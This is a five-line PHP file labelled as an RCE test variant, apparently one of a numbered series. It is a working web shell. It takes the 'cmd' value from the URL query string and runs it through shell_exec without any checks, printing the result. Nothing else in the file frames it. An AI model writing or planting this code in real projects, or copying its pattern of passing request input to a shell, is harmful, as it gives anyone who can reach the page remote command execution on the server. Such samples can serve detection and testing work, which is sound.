<?php
// RCE test variation #154
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>